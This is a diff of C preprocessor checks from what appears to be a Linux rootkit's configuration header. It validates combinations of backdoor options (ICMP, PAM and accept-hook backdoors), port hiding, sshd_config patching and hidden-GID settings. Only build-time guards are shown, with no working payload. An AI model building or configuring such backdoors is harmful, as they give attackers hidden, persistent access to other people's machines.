@@ -1,16 +1,27 @@
-#ifndef USE_PAM_BD
-#warning "USE_PAM_BD: undefined - what are you gonna do?"
+#if !defined USE_ICMP_BD && !defined USE_PAM_BD && !defined USE_ACCEPT_BD
+#warning "No backdoor method selected"
 #endif
 
-#if defined HARD_PATCH_SSHD_CONFIG && defined SOFT_PATCH_SSHD_CONFIG
-#error "HARD_PATCH_SSHD_CONFIG & SOFT_PATCH_SSHD_CONFIG cannot be defined simultaneously"
+#if defined USE_ACCEPT_BD && !defined HIDE_PORTS
+#error "USE_ACCEPT_BD: HIDE_PORTS must be defined"
 #endif
-#if (!defined HARD_PATCH_SSHD_CONFIG && !defined SOFT_PATCH_SSHD_CONFIG) && defined USE_PAM_BD
-#warning "There is no PATCH_SSHD_CONFIG defined"
+#if defined USE_ICMP_BD && !defined HIDE_PORTS
+#error "USE_ICMP_BD: HIDE_PORTS must be defined"
 #endif
+
+#if defined SSHD_PATCH_HARD && defined SSHD_PATCH_SOFT
+#error "SSHD_PATCH_HARD & SSHD_PATCH_SOFT cannot be defined simultaneously"
+#endif
+#if (!defined SSHD_PATCH_HARD && !defined SSHD_PATCH_SOFT) && defined USE_PAM_BD
+#warning "USE_PAM_BD: There is no PATCH_SSHD_CONFIG defined"
+#endif
+#if (defined SSHD_PATCH_HARD || defined SSHD_PATCH_SOFT) && !defined USE_PAM_BD
+#warning "A PATCH_SSHD_CONFIG is defined while USE_PAM_BD is not"
+#endif
+
 
 #if defined READ_GID_FROM_FILE  && !defined BACKDOOR_UTIL
-#warning "READ_GID_FROM_FILE: GID changing is not safely possible without BACKDOOR_UTIL defined"
+#warning "READ_GID_FROM_FILE: MANUAL GID changing is not SAFELY possible without BACKDOOR_UTIL defined"
 #endif
 #if !defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
 #error "AUTO_GID_CHANGER: READ_GID_FROM_FILE must be defined"
